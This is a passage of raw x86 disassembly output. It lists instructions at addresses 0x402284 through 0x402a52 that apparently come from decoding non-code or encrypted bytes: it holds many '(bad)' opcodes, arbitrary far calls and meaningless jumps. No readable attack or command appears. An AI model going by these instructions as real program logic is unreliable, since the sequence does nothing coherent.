  402284:	les    edx,FWORD PTR [eax-0x393947a3]
  40228a:	mov    WORD PTR [edx],gs
  40228c:	call   0xf2c:0xed37c8af
  402293:	and    al,0x3a
  402295:	(bad)  
  402296:	mov    bl,0x6a
  402298:	in     al,dx
  402299:	ins    BYTE PTR es:[edi],dx
  40229a:	xor    bh,al
  40229c:	mov    esi,0xbfa1b35e
  4022a2:	(bad)  
  4022a3:	stc    
  4022a4:	sub    al,BYTE PTR [ecx-0x429b6712]
  4022aa:	and    al,0x9f
  4022ac:	pop    es
  4022ad:	nop
  4022ae:	inc    edi
  4022af:	jle    0x402278
  4022b1:	inc    ebp
  4022b2:	test   esp,edx
  4022b4:	je     0x402286
  4022b6:	and    ch,ch
  4022b8:	sbb    al,0x5b
  4022ba:	(bad)  
  4022bb:	xchg   esp,eax
  4022bc:	imul   ecx,esp,0xe8bc611c
  4022c2:	sbb    DWORD PTR [ecx+ecx*1-0x48],ebp
  4022c6:	cs inc ebx
  4022c8:	push   es
  4022c9:	xor    DWORD PTR [ebx+0x5d],0xe9ffbbd
  4022d0:	(bad)  
  4022d1:	push   esp
  4022d2:	xor    bl,ch
  4022d4:	dec    edx
  4022d5:	push   0x6089725c
  4022da:	mov    bh,bh
  4022dc:	nop
  4022dd:	sbb    DWORD PTR [edi],ecx
  4022df:	lea    esp,[edi]
  4022e1:	mov    ebx,DWORD PTR [ecx+edi*2-0x4f45f14c]
  4022e8:	pop    ecx
  4022e9:	sub    DWORD PTR [edx],esi
  4022eb:	aas    
  4022ec:	and    BYTE PTR [esi+0x24],0x82
  4022f0:	fwait
  4022f1:	in     eax,0x50
  4022f3:	or     dl,BYTE PTR [edx]
  4022f5:	and    al,0xad
  4022f7:	push   ebp
  4022f8:	jae    0x402367
  4022fa:	call   0xd55dbf13
  4022ff:	and    esi,esi
  402301:	inc    ebp
  402302:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402303:	sbb    eax,0xb4eb27cd
  402308:	out    0xf3,al
  40230a:	shl    BYTE PTR [ecx],cl
  40230c:	jbe    0x402343
  40230e:	or     ebx,ebp
  402310:	add    al,0x7b
  402312:	gs aaa 
  402314:	fucomp st(5)
  402316:	std    
  402317:	sub    BYTE PTR [ebx+0x19],ch
  40231a:	mov    esp,0xcb9c6dd
  40231f:	mul    BYTE PTR [edi+0x5dec37b7]
  402325:	push   es
  402326:	fs push ss
  402328:	pop    ebx
  402329:	push   bx
  40232b:	fimul  WORD PTR [eax-0xba588a5]
  402331:	or     bh,dh
  402333:	sub    cl,0x3e
  402336:	add    cl,BYTE PTR [ebx+edx*2-0x6e4b731b]
  40233d:	pop    es
  40233e:	pop    ss
  40233f:	inc    edx
  402340:	mov    esi,0x8ed26240
  402345:	and    DWORD PTR [eiz*1+0x14d8f30c],ebp
  40234c:	pop    ecx
  40234d:	adc    edi,DWORD PTR ds:0xd83bdd55
  402353:	add    DWORD PTR [esi-0x1d560750],0xffffff9c
  40235a:	(bad)
  40235e:	popf   
  40235f:	out    dx,al
  402360:	imul   edi,DWORD PTR [edi],0xfffffffe
  402363:	mov    edi,0x5c08662c
  402368:	pop    edi
  402369:	rcr    DWORD PTR [edx+0x8256418],cl
  40236f:	enter  0x82a0,0x24
  402373:	xor    al,0xc9
  402375:	mov    WORD PTR [eax],cs
  402377:	retf   0xe8a1
  40237a:	not    bh
  40237c:	mov    ds:0x284d9b2a,eax
  402381:	cdq    
  402382:	ja     0x4023a9
  402384:	lods   al,BYTE PTR ds:[esi]
  402385:	mov    ebx,0xc5948966
  40238a:	in     al,0x61
  40238c:	sbb    ax,dx
  40238f:	jecxz  0x402398
  402391:	push   ebx
  402392:	inc    ebx
  402393:	mov    bl,0xc7
  402395:	add    DWORD PTR [ebp-0x3e86a13e],esp
  40239b:	xlat   BYTE PTR ds:[ebx]
  40239c:	xchg   ecx,eax
  40239d:	push   edi
  40239e:	lahf   
  40239f:	lock ret 
  4023a1:	sub    BYTE PTR [eax-0x10],ch
  4023a4:	xor    ah,bl
  4023a6:	and    DWORD PTR [ebp+0x78],0x3b
  4023aa:	cdq    
  4023ab:	shl    BYTE PTR [edx-0x5ed92d96],1
  4023b1:	pop    ecx
  4023b2:	or     bl,BYTE PTR [edi+0x519dade]
  4023b8:	and    ch,dh
  4023ba:	push   esp
  4023bb:	cmc    
  4023bc:	jno    0x4023ba
  4023be:	or     esi,DWORD PTR [esi+esi*8-0x21]
  4023c2:	push   0xb4123c7c
  4023c7:	int    0x15
  4023c9:	sbb    bl,BYTE PTR [edx-0x223b646c]
  4023cf:	pop    ebx
  4023d0:	cmc    
  4023d1:	ds (bad) 
  4023d3:	push   ebx
  4023d4:	shl    esi,cl
  4023d6:	mov    edi,0x8de1a4c3
  4023db:	scas   eax,DWORD PTR es:[edi]
  4023dc:	sbb    eax,0xb79f4fd9
  4023e1:	in     eax,dx
  4023e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023e3:	sti    
  4023e4:	jecxz  0x402450
  4023e6:	lods   al,BYTE PTR ds:[esi]
  4023e7:	push   ebp
  4023e8:	xor    BYTE PTR [ecx],dh
  4023ea:	dec    ecx
  4023eb:	popa   
  4023ec:	add    bl,cl
  4023ee:	mov    al,BYTE PTR [edx-0x16]
  4023f1:	xchg   esp,eax
  4023f2:	lock leave 
  4023f4:	xor    bh,dh
  4023f6:	mov    ebp,0x8456adba
  4023fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023fc:	or     al,0x3e
  4023fe:	sti    
  4023ff:	mov    bh,0x5d
  402401:	sbb    bl,BYTE PTR [edx+0x15]
  402404:	pop    esp
  402405:	fwait
  402406:	push   es
  402407:	gs mov bh,ch
  40240a:	adc    eax,edi
  40240c:	enter  0x8ee5,0xda
  402410:	fsubr  QWORD PTR ds:0x918d5c02
  402416:	pop    ss
  402417:	fild   WORD PTR [edx+0x5a]
  40241a:	ret    
  40241b:	lods   eax,DWORD PTR ds:[esi]
  40241c:	mov    WORD PTR [ebp+0x1bc64753],?
  402422:	mov    edx,0x81547701
  402427:	jl     0x4023b4
  402429:	mov    ah,0xfc
  40242b:	fisttp WORD PTR [esi+edx*2+0x6c]
  40242f:	xchg   edx,eax
  402430:	inc    edi
  402431:	ror    DWORD PTR [esi],cl
  402433:	cmc    
  402434:	cmp    ebx,edx
  402436:	pop    ds
  402437:	add    DWORD PTR [ecx-0x7f],edi
  40243a:	cmp    edx,DWORD PTR [ecx+0x56]
  40243d:	out    dx,al
  40243e:	add    edx,DWORD PTR [esi+0x36]
  402441:	data16 jl 0x4023ec
  402444:	mov    al,ds:0x37bbbafb
  402449:	cld    
  40244a:	or     al,0x3c
  40244c:	mov    ds:0xa6fd8133,eax
  402451:	cmp    cl,BYTE PTR [ebp-0xd2ed3d1]
  402457:	mov    esi,0x66fdf2d2
  40245c:	jae    0x40241d
  40245e:	into   
  40245f:	mov    esi,0xcf1fc7c
  402464:	mov    DWORD PTR [eax-0x38],ebx
  402467:	xchg   esi,eax
  402468:	mov    WORD PTR [ecx],?
  40246a:	xor    bh,BYTE PTR [ebx]
  40246c:	cmp    eax,0xcda4bbd8
  402471:	mov    esi,0x6abd32a4
  402476:	pop    ebx
  402477:	sub    al,0x1b
  402479:	int3   
  40247a:	xchg   ebp,eax
  40247b:	mov    dl,0x7d
  40247d:	pop    es
  40247e:	ret    
  40247f:	jmp    0xe307603c
  402484:	scas   eax,DWORD PTR es:[edi]
  402485:	idiv   dl
  402487:	ins    DWORD PTR es:[edi],dx
  402488:	mov    dl,0xf
  40248a:	les    ecx,FWORD PTR ss:[esi+0x16]
  40248e:	enter  0x40a3,0xa3
  402492:	sbb    al,0xfb
  402494:	push   cs
  402495:	mov    esi,ebp
  402497:	lock fs ja 0x402476
  40249b:	scas   al,BYTE PTR es:[edi]
  40249c:	enter  0x3505,0xcb
  4024a0:	popa   
  4024a1:	xchg   DWORD PTR [edx+edi*8+0x35d9a295],eax
  4024a8:	int    0xea
  4024aa:	es jle 0x4024bc
  4024ad:	sub    BYTE PTR [edx+0x719bc66a],bl
  4024b3:	ret    0x52ea
  4024b6:	mov    ah,0x38
  4024b8:	push   eax
  4024b9:	pushf  
  4024ba:	je     0x402511
  4024bc:	cli    
  4024bd:	add    al,0x67
  4024bf:	(bad)  
  4024c0:	imul   ebx,DWORD PTR [edi-0x7e],0x513e659d
  4024c7:	push   cs
  4024c8:	nop
  4024c9:	add    eax,0x51569ebe
  4024ce:	xor    ebx,esp
  4024d0:	xor    eax,0xf09961dd
  4024d5:	loopne 0x4024d5
  4024d7:	loop   0x4024d3
  4024d9:	cld    
  4024da:	idiv   DWORD PTR [edi]
  4024dc:	mov    dl,0xa3
  4024de:	jge    0x4024d1
  4024e0:	arpl   WORD PTR [ecx],bx
  4024e2:	cmp    edi,DWORD PTR [edi-0x6866b4a0]
  4024e8:	xor    esp,ebp
  4024ea:	(bad)  
  4024eb:	add    DWORD PTR [esi-0x65],edi
  4024ee:	adc    esi,ecx
  4024f0:	inc    esi
  4024f1:	aas    
  4024f2:	mov    ecx,0xf27d6370
  4024f7:	aam    0xbf
  4024f9:	mov    al,ds:0x13ea973e
  4024fe:	stos   BYTE PTR es:[edi],al
  4024ff:	imul   edx,DWORD PTR [esi+0x5ca914cb],0x4afd4362
  402509:	push   es
  40250a:	mulps  xmm1,XMMWORD PTR ds:0x6ab63c90
  402511:	push   ebx
  402512:	idiv   dl
  402514:	xchg   ebx,eax
  402515:	mov    ebp,0x84bcadff
  40251a:	sub    ecx,ebx
  40251c:	(bad)  
  40251d:	test   eax,0x694de3bc
  402522:	sbb    dh,al
  402524:	imul   esp,DWORD PTR [esi+eiz*2],0x3eae828d
  40252b:	retf   0x4c1e
  40252e:	jl     0x40257f
  402530:	sbb    esi,DWORD PTR [esi-0x6ab595bb]
  402536:	in     eax,0x95
  402538:	jne    0x402599
  40253a:	mov    ch,BYTE PTR [ebp-0x6865bbb8]
  402540:	cwde   
  402541:	or     eax,0x1d6fc124
  402546:	outs   dx,BYTE PTR ds:[esi]
  402547:	or     eax,0x42ba8c11
  40254c:	inc    edi
  40254d:	or     al,0x7a
  40254f:	mov    al,0x95
  402551:	in     eax,0xc3
  402553:	add    DWORD PTR [ebp+0x17],eax
  402556:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402557:	popa   
  402558:	or     ch,al
  40255a:	call   0xc5d909c0
  40255f:	xchg   esp,eax
  402560:	push   edi
  402561:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402562:	mov    DWORD PTR [esi],edi
  402564:	test   al,0x9d
  402566:	dec    eax
  402567:	mov    ecx,0x11b3ea91
  40256c:	inc    dh
  40256e:	pop    ss
  40256f:	fild   QWORD PTR [ebp+edi*4-0x1227dc78]
  402576:	sub    al,0xc1
  402578:	sbb    BYTE PTR [edx+0x316c720e],dl
  40257e:	nop
  40257f:	es xchg esp,eax
  402581:	int    0x96
  402583:	scas   al,BYTE PTR es:[edi]
  402584:	cwde   
  402585:	int3   
  402586:	call   0x12c9e1b1
  40258b:	push   ebx
  40258c:	mov    ?,edx
  40258e:	pop    ebx
  40258f:	jno    0x402553
  402591:	push   ds
  402592:	pop    esi
  402593:	mov    bl,0xdf
  402595:	push   edi
  402596:	and    ebx,DWORD PTR [eax]
  402598:	sbb    bl,BYTE PTR [ecx+ecx*4+0x70ef10ea]
  40259f:	repnz dec esi
  4025a1:	je     0x4025ed
  4025a3:	dec    esi
  4025a4:	and    ebp,DWORD PTR [edx]
  4025a6:	jl     0x402556
  4025a8:	jnp    0x40261d
  4025aa:	jbe    0x4025df
  4025ac:	aad    0x16
  4025ae:	cmp    BYTE PTR [edx+eax*2+0x779a08ec],al
  4025b5:	test   BYTE PTR [esi],0x5c
  4025b8:	and    al,0xcc
  4025ba:	sbb    eax,0xcc680d77
  4025bf:	ins    DWORD PTR es:[edi],dx
  4025c0:	and    eax,0xe445bc2d
  4025c5:	cmp    esp,DWORD PTR [edi]
  4025c7:	in     eax,dx
  4025c8:	inc    esp
  4025c9:	ficom  DWORD PTR [edi]
  4025cb:	sbb    BYTE PTR [ebx+ecx*1+0x59],al
  4025cf:	and    eax,DWORD PTR [edi]
  4025d1:	icebp  
  4025d2:	(bad)  
  4025d3:	out    0xea,al
  4025d5:	push   ebx
  4025d6:	hlt    
  4025d7:	mul    DWORD PTR [eax+0x12580d51]
  4025dd:	jae    0x4025a7
  4025df:	pop    esp
  4025e0:	sub    BYTE PTR [esi-0xb33198d],dh
  4025e6:	jne    0x4025ea
  4025e8:	or     eax,0x41447d2a
  4025ed:	imul   esi,esp,0x68fb2b76
  4025f3:	pop    ebx
  4025f4:	or     BYTE PTR [edx+0x233a3ffa],dl
  4025fa:	xchg   esp,eax
  4025fb:	xchg   esp,eax
  4025fc:	mov    ah,0xa9
  4025fe:	mov    ch,0x7a
  402600:	icebp  
  402601:	jnp    0x4025f0
  402603:	hlt    
  402604:	fsubrp st(7),st
  402606:	outs   dx,BYTE PTR ds:[esi]
  402607:	xor    BYTE PTR [edx],dl
  402609:	mov    fs,WORD PTR [edx-0x8f10b41]
  40260f:	jecxz  0x402678
  402611:	fcomip st,st(4)
  402613:	xor    al,0xd5
  402615:	popa   
  402616:	sub    ax,0x7e39
  40261a:	sbb    BYTE PTR [edi+esi*1-0x52d8485a],cl
  402621:	(bad)  
  402622:	push   es
  402623:	ds repnz (bad) 
  402626:	mov    eax,0xa6d315ed
  40262b:	jmp    0x40267d
  40262d:	psraw  mm4,mm3
  402630:	or     bh,cl
  402632:	xchg   esi,eax
  402633:	lods   al,BYTE PTR ds:[esi]
  402634:	pop    esp
  402635:	test   al,0xfc
  402637:	mov    edi,0x7a0be537
  40263c:	cmovae edi,DWORD PTR [ecx-0x79cb2130]
  402643:	outs   dx,DWORD PTR ds:[esi]
  402644:	or     DWORD PTR [edi],ebp
  402646:	in     eax,dx
  402647:	mov    bh,0xb2
  402649:	leave  
  40264a:	push   edi
  40264b:	inc    esp
  40264c:	loop   0x402691
  40264e:	cwde   
  40264f:	jecxz  0x40266e
  402651:	sbb    DWORD PTR [ecx+ecx*2+0x65707db8],ecx
  402658:	pushaw 
  40265a:	clc    
  40265b:	loope  0x4025f1
  40265d:	mov    WORD PTR [edx],gs
  40265f:	mov    dl,0x61
  402661:	mov    ch,0x1e
  402663:	dec    ecx
  402664:	sbb    edi,DWORD PTR [ecx+eax*2-0x2340da07]
  40266b:	stos   DWORD PTR es:[edi],eax
  40266c:	sbb    al,0xc8
  40266e:	cli    
  40266f:	psubb  mm3,QWORD PTR [edi-0x25fe6ba8]
  402676:	test   eax,0xd9496ecd
  40267b:	aas    
  40267c:	dec    ebp
  40267d:	push   ecx
  40267e:	push   ebp
  40267f:	bound  ebp,QWORD PTR [eax]
  402681:	popf   
  402682:	mov    al,ds:0xd6cee06d
  402687:	mov    bh,0xb2
  402689:	fmul   QWORD PTR [ecx-0x60]
  40268c:	sub    eax,0x76cd2af7
  402691:	leave  
  402692:	xor    BYTE PTR [eax+0x57],bl
  402695:	sub    eax,0xdee71c1f
  40269a:	jl     0x4026c0
  40269c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40269d:	pop    esi
  40269e:	push   0xcdd7bd4e
  4026a3:	xchg   edx,eax
  4026a4:	stos   DWORD PTR es:[edi],eax
  4026a5:	inc    esi
  4026a6:	neg    DWORD PTR [edx-0x5b]
  4026a9:	fisttp QWORD PTR ds:0xa776bd69
  4026af:	dec    ebp
  4026b0:	add    eax,0x5d865ddb
  4026b5:	and    ah,cl
  4026b7:	das    
  4026b8:	js     0x4026ba
  4026ba:	or     ebx,DWORD PTR [eax+0x39]
  4026bd:	test   eax,0xf8042ba1
  4026c2:	mov    bl,0xd1
  4026c4:	mov    ecx,0x74da49a2
  4026c9:	test   al,0xb9
  4026cb:	call   0x2a7da73f
  4026d0:	iret   
  4026d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026d2:	xchg   edi,eax
  4026d3:	inc    esp
  4026d4:	xchg   esi,eax
  4026d5:	and    edx,DWORD PTR [edi+0x65dd0c64]
  4026db:	out    dx,eax
  4026dc:	loop   0x4026d3
  4026de:	loopne 0x4026ee
  4026e0:	outs   dx,DWORD PTR ds:[esi]
  4026e1:	(bad)  
  4026e2:	lds    edi,FWORD PTR [ebp-0x4e]
  4026e5:	addr16 dec esi
  4026e8:	xchg   ecx,eax
  4026e9:	imul   ebx,DWORD PTR [ebx+0x30],0xffffffc3
  4026ed:	clc    
  4026ee:	xor    eax,0xcb239c36
  4026f3:	cdq    
  4026f4:	loopne 0x402727
  4026f6:	ret    0xea3d
  4026f9:	jmp    0x6896af1c
  4026fe:	pop    ebp
  4026ff:	test   BYTE PTR [ebx],dl
  402701:	xchg   BYTE PTR [edx+0x37],dh
  402704:	mov    edx,0x95173a17
  402709:	push   esi
  40270a:	es push ss
  40270c:	sub    cl,0x9c
  40270f:	or     BYTE PTR [eax+0x35],ah
  402712:	loopne 0x40277d
  402714:	lods   eax,DWORD PTR ds:[esi]
  402715:	ins    BYTE PTR es:[edi],dx
  402716:	mov    ah,0x28
  402718:	and    BYTE PTR [edx-0x17],dh
  40271b:	inc    edx
  40271c:	mov    cl,bl
  40271e:	fstp   DWORD PTR [edi-0x1c]
  402721:	stc    
  402722:	scas   al,BYTE PTR es:[edi]
  402723:	out    0xa0,al
  402725:	(bad)  
  402726:	jae    0x4026ec
  402728:	in     eax,dx
  402729:	cld    
  40272a:	push   edx
  40272b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40272c:	mov    ?,WORD PTR [ecx-0x1c]
  40272f:	mov    esp,0xa0fcb4de
  402734:	iret   
  402735:	out    0x67,eax
  402737:	mov    edi,0x80162927
  40273c:	mov    ebp,0x834c7570
  402741:	(bad)  
  402742:	dec    ebx
  402743:	(bad)  
  402744:	nop
  402745:	adc    BYTE PTR [ecx+0xc146f15],0x40
  40274c:	mov    cl,0x76
  40274e:	nop
  40274f:	mov    al,dh
  402751:	call   0x529c:0x6de153dd
  402758:	sub    BYTE PTR [ecx+0x68],bl
  40275b:	popa   
  40275c:	push   ss
  40275d:	push   esp
  40275e:	sbb    DWORD PTR [ebx+ebp*1],0xfc871018
  402765:	mov    ah,0x70
  402767:	jbe    0x40278b
  402769:	in     al,0xdd
  40276b:	lds    ebx,FWORD PTR [ebx+0x70b3118]
  402771:	mov    bh,0x67
  402773:	stos   DWORD PTR es:[edi],eax
  402774:	lods   eax,DWORD PTR ds:[esi]
  402775:	xor    DWORD PTR ds:0x4c966781,eax
  40277b:	sti    
  40277c:	lods   eax,DWORD PTR ds:[esi]
  40277d:	jo     0x402776
  40277f:	mov    ebx,0x2d05af2c
  402784:	jl     0x40276c
  402786:	arpl   dx,sp
  402788:	dec    BYTE PTR [edx-0x9]
  40278b:	mov    ch,0xfb
  40278d:	test   DWORD PTR [esi],0x361fb351
  402793:	dec    ebx
  402794:	mov    edi,0x4de400c
  402799:	push   0xff6d1258
  40279e:	int3   
  40279f:	sub    edx,DWORD PTR [ebx]
  4027a1:	xor    eax,0x29bb6e91
  4027a6:	dec    eax
  4027a7:	add    ch,0xc2
  4027aa:	cdq    
  4027ab:	xor    al,0xa0
  4027ad:	stc    
  4027ae:	mov    DWORD PTR [edx-0x583ce378],eax
  4027b4:	add    BYTE PTR [eax+eax*4],0x5d
  4027b8:	pop    ecx
  4027b9:	jb     0x40280f
  4027bb:	mov    eax,0xf5979786
  4027c0:	cmp    BYTE PTR [ecx],0xe4
  4027c3:	stos   BYTE PTR es:[edi],al
  4027c4:	sbb    DWORD PTR [ebp+0x50],edi
  4027c7:	ret    0xfa0a
  4027ca:	cli    
  4027cb:	or     al,0xa2
  4027cd:	mov    cl,0x4f
  4027cf:	js     0x4027fa
  4027d1:	sbb    BYTE PTR [ebx],cl
  4027d3:	dec    ecx
  4027d4:	popf   
  4027d5:	jo     0x402852
  4027d7:	xor    al,0x65
  4027d9:	xchg   BYTE PTR [ebx],bl
  4027db:	dec    ebx
  4027dc:	call   0x8b38:0x59f072f0
  4027e3:	jns    0x40280b
  4027e5:	in     eax,0x16
  4027e7:	jno    0x402833
  4027e9:	out    0x79,eax
  4027eb:	das    
  4027ec:	push   cs
  4027ed:	ret    
  4027ee:	std    
  4027ef:	sbb    ah,BYTE PTR [edx]
  4027f1:	(bad)  
  4027f2:	fs jns 0x402857
  4027f5:	push   ebp
  4027f6:	push   ecx
  4027f7:	dec    esp
  4027f8:	lahf   
  4027f9:	outs   dx,DWORD PTR ds:[esi]
  4027fa:	fldenv [esi+eiz*2-0x1b]
  4027fe:	test   eax,0x3783e9bd
  402803:	test   eax,0x4e6081c6
  402808:	xor    al,al
  40280a:	and    BYTE PTR [eax-0x4],bh
  40280d:	hlt    
  40280e:	mov    al,0xc9
  402810:	adc    ch,BYTE PTR [eax+0xc]
  402813:	aas    
  402814:	ret    0x5940
  402817:	add    ebx,DWORD PTR [bp+di+0x1460]
  40281c:	fsubp  st(7),st
  40281e:	call   0x280b:0xf304c971
  402825:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402826:	cs daa 
  402828:	sbb    DWORD PTR [edi],ecx
  40282a:	shr    al,1
  40282c:	xchg   esp,eax
  40282d:	js     0x402815
  40282f:	repnz fwait
  402831:	cld    
  402832:	mov    esp,0x2bb9d6c7
  402837:	rsm    
  402839:	pop    esi
  40283a:	jo     0x402847
  40283c:	enter  0xc59d,0xb
  402840:	in     al,dx
  402841:	fcomp  DWORD PTR [ebx-0x7c]
  402844:	scas   eax,DWORD PTR es:[edi]
  402845:	mov    eax,0x8c84f943
  40284a:	in     al,0xea
  40284c:	push   cs
  40284d:	iret   
  40284e:	dec    eax
  40284f:	mov    ds:0x1f332a1b,al
  402854:	pushf  
  402855:	mov    edi,0x5c8bf35b
  40285a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40285b:	xor    ebp,DWORD PTR [ecx+edx*8-0x6a72e980]
  402862:	in     al,dx
  402863:	push   esp
  402864:	in     eax,0x79
  402866:	push   ds
  402867:	sbb    cl,0x52
  40286a:	stc    
  40286b:	loop   0x4027f5
  40286d:	cs std 
  40286f:	stc    
  402870:	mov    DWORD PTR [eax-0x1052ff8f],esp
  402876:	in     eax,dx
  402877:	mov    WORD PTR [eax],ss
  402879:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40287b:	add    DWORD PTR [edi-0x39],ebp
  40287e:	mov    ch,dl
  402880:	rol    DWORD PTR [ecx+ebx*2],cl
  402883:	pop    ebp
  402884:	xor    BYTE PTR [ebp+0x5c],bh
  402887:	cli    
  402888:	xor    esp,DWORD PTR [ecx+0x5f]
  40288b:	mov    ds:0x51bd8841,al
  402890:	inc    esp
  402891:	inc    eax
  402892:	inc    edi
  402893:	jge    0x402835
  402895:	pusha  
  402896:	ds sbb eax,esp
  402899:	(bad)  
  40289b:	outs   dx,BYTE PTR ds:[esi]
  40289c:	xchg   edx,eax
  40289d:	or     eax,0x16ae1731
  4028a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028a3:	outs   dx,DWORD PTR ds:[esi]
  4028a4:	jnp    0x402924
  4028a6:	mov    edx,0xebb142c9
  4028ab:	jp     0x4028d2
  4028ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028ae:	iret   
  4028af:	ins    BYTE PTR es:[edi],dx
  4028b0:	pop    eax
  4028b1:	in     al,dx
  4028b2:	fild   WORD PTR [esi+0x3d]
  4028b5:	scas   eax,DWORD PTR es:[edi]
  4028b6:	mov    eax,0xd72f7222
  4028bb:	pop    eax
  4028bc:	ss dec edi
  4028be:	daa    
  4028bf:	mov    edi,0x71e56d73
  4028c4:	push   esp
  4028c5:	lock es inc ecx
  4028c8:	jns    0x402853
  4028ca:	dec    esp
  4028cb:	dec    ebx
  4028cc:	and    DWORD PTR [eax],edi
  4028ce:	mov    eax,0x6215a701
  4028d3:	leave  
  4028d4:	outs   dx,BYTE PTR ds:[esi]
  4028d5:	jg     0x4028d8
  4028d7:	mov    ah,0x6
  4028d9:	and    BYTE PTR [eax-0x24eff521],cl
  4028df:	popa   
  4028e0:	fwait
  4028e1:	bound  edx,QWORD PTR [ebp+0x3e47ae79]
  4028e7:	arpl   WORD PTR [edi+0x7213ecd1],bx
  4028ed:	mov    edx,0x3c4dcd88
  4028f2:	and    eax,0x81604e1a
  4028f7:	dec    edi
  4028f8:	mov    WORD PTR [eax-0x81773dd],?
  4028fe:	mov    ebp,eax
  402900:	rol    DWORD PTR [edx-0x7719bff2],0xa9
  402907:	pop    edi
  402908:	or     eax,0xf09f15d8
  40290d:	sbb    eax,DWORD PTR [edi-0x247912e1]
  402913:	lods   eax,DWORD PTR ds:[esi]
  402914:	pusha  
  402915:	pop    ebx
  402916:	scas   al,BYTE PTR es:[edi]
  402917:	setae  ah
  40291a:	into   
  40291b:	pop    esi
  40291c:	dec    edx
  40291d:	bound  ebx,QWORD PTR [eax+eax*8+0x56663dc]
  402924:	out    0x96,eax
  402926:	call   0x265c:0x1dceb70a
  40292d:	mov    dl,0x85
  40292f:	add    ebx,DWORD PTR [ebx-0x29]
  402932:	fbld   TBYTE PTR [edx-0x210ec518]
  402938:	in     eax,0x84
  40293a:	aam    0x8c
  40293c:	cmp    BYTE PTR [ecx-0xb],0x62
  402940:	inc    edi
  402941:	jne    0x40293c
  402943:	loopne 0x402941
  402945:	shl    DWORD PTR [edi],1
  402947:	stc    
  402948:	call   0xc903:0x9152543d
  40294f:	stos   BYTE PTR es:[edi],al
  402950:	sub    BYTE PTR ss:[ecx+0x1069f777],cl
  402957:	fld    TBYTE PTR [eax]
  402959:	mov    edx,0x7a69f479
  40295e:	repnz movs BYTE PTR es:[di],BYTE PTR ds:[si]
  402961:	push   es
  402962:	mov    bl,0x13
  402964:	jecxz  0x402997
  402966:	imul   cl
  402968:	adc    eax,0x38d68705
  40296d:	push   edi
  40296e:	pop    ebx
  40296f:	lods   al,BYTE PTR ds:[esi]
  402970:	mov    bh,0xe7
  402972:	or     DWORD PTR [eax-0x52],esi
  402975:	xchg   edi,eax
  402976:	push   esi
  402977:	mov    ds:0xc4c93453,eax
  40297c:	loope  0x4029c6
  40297e:	mov    ebx,0xb0b40627
  402983:	xlat   BYTE PTR ds:[ebx]
  402984:	inc    edi
  402985:	cmp    al,0x19
  402987:	arpl   WORD PTR [edx],cx
  402989:	xchg   esp,eax
  40298a:	dec    edx
  40298b:	(bad)  
  40298c:	cld    
  40298d:	push   esi
  40298e:	sahf   
  40298f:	repz pusha 
  402991:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402992:	ja     0x402981
  402994:	cld    
  402995:	pop    es
  402996:	add    BYTE PTR [edx],al
  402998:	push   ebx
  402999:	push   0x12f9afc0
  40299e:	xor    DWORD PTR [ecx],edx
  4029a0:	dec    ecx
  4029a1:	fild   WORD PTR [edi]
  4029a3:	repz addr16 mov dh,dh
  4029a7:	mov    ch,0xf2
  4029a9:	mov    ebp,eax
  4029ab:	fst    st(2)
  4029ad:	adc    esi,DWORD PTR [edx+eiz*1-0x11]
  4029b1:	test   al,0x10
  4029b3:	xchg   esi,eax
  4029b4:	dec    eax
  4029b5:	mov    bh,0x42
  4029b7:	gs sbb al,0x7a
  4029ba:	mov    eax,DWORD PTR [edx-0x1b]
  4029bd:	stc    
  4029be:	pop    ss
  4029bf:	sbb    ebx,0xfffffffb
  4029c2:	(bad)  
  4029c3:	mov    eax,ds:0x9c5186d3
  4029c8:	hlt    
  4029c9:	vmaxss xmm3,xmm3,xmm5
  4029cd:	push   eax
  4029ce:	jg     0x40296b
  4029d0:	out    dx,al
  4029d1:	inc    esi
  4029d2:	popf   
  4029d3:	sahf   
  4029d4:	xchg   esp,eax
  4029d5:	bound  edi,QWORD PTR [esi+ebp*2]
  4029d8:	mov    ebp,eax
  4029da:	(bad)  
  4029db:	push   edi
  4029dc:	mul    DWORD PTR ds:0xe266cb79
  4029e2:	pop    ecx
  4029e3:	mov    BYTE PTR [edx+esi*8+0x47],ch
  4029e7:	cdq    
  4029e8:	push   0x6f
  4029ea:	es cld 
  4029ec:	arpl   WORD PTR [ebx],bx
  4029ee:	xlat   BYTE PTR ds:[ebx]
  4029ef:	sub    al,0xf4
  4029f1:	out    dx,al
  4029f2:	in     eax,0x21
  4029f4:	sub    BYTE PTR [edi-0x50eb4391],ah
  4029fa:	pop    es
  4029fb:	or     DWORD PTR [ebp-0x1e],0x82ec10d6
  402a02:	mov    dl,BYTE PTR [ecx+0x6d]
  402a05:	adc    al,0x54
  402a07:	or     al,0xf7
  402a09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a0a:	push   0xd04f9e9b
  402a0f:	jmp    0x1f2eb2ed
  402a14:	mov    bh,0x82
  402a16:	add    edx,DWORD PTR [ecx]
  402a18:	inc    edi
  402a19:	imul   ebp,DWORD PTR [ebp+0x8],0xffffffa5
  402a1d:	mov    esp,0xe4f3e9b1
  402a22:	dec    ecx
  402a23:	pop    esp
  402a24:	cmp    DWORD PTR ds:0x15d25d2c,edx
  402a2a:	mov    bl,0x90
  402a2c:	push   0xfffffffc
  402a2e:	mov    bl,BYTE PTR [eax-0x481a618f]
  402a34:	jmp    0x402a2b
  402a36:	(bad)  
  402a37:	and    DWORD PTR [esp+eiz*2-0x2b],esp
  402a3b:	rcr    esp,0x14
  402a3e:	pop    ebx
  402a3f:	push   ds
  402a40:	or     edx,DWORD PTR [ebx-0x2a2e3c58]
  402a46:	or     bh,BYTE PTR [edx-0x7758455c]
  402a4c:	fimul  WORD PTR [ecx]
  402a4e:	test   bh,0x94
  402a51:	in     eax,dx
  402a52:	xor    dl,bh
